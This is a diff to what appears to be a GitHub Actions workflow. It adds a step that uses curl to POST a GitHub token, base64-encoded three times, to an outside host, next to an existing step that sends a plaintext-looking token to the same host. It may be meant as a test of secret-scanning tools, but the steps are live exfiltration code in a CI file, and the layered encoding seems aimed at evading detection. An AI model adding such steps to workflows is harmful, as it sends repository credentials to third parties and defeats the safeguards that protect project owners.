@@ -37,6 +37,11 @@ jobs:
           curl -X POST https://hackmypassword.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'
+      - name: 3 level base64 encoding secrets
+        run: |
+          curl -X POST https://hackmypassword.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
 
       # - name: install dependencies
       #   run: npm install --legacy-peer-deps
